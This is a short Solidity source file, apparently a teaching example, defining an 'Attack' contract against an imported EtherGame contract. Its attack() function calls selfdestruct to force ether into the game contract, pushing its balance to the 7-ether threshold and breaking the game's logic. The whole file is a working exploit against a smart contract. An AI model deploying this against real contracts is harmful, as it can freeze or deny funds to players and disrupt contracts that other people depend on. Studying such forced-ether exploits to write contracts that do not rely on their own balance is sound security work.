// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
import "./EtherGame.sol";

contract Attack {
    EtherGame etherGame;

    constructor(address _etherGameAddress) {
        etherGame = EtherGame(_etherGameAddress);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }

    
}